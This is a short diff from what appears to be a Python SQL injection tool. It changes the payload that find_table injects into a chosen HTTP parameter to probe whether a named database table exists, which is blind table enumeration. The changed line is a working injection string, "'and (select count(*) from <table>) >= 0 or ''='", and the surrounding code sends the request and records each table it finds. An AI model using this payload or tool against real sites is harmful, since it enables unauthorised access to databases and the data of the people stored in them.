@@ -68,7 +68,7 @@ def find_tables(url, params, param_to_test, file_table):
         find_table(url, params, param_to_test, table)
 
 def find_table(url, params, param_to_test, table_name):
-    params[param_to_test] = "'and (select test from " + table_name + " where test = 1) or ''='"
+    params[param_to_test] = "'and (select count(*) from " + table_name + ") >= 0 or ''='"
     req = send_HTTP_request(url, params)
     if (table_exists(req.content)):
         insert_table_name_in_tables(table_name)
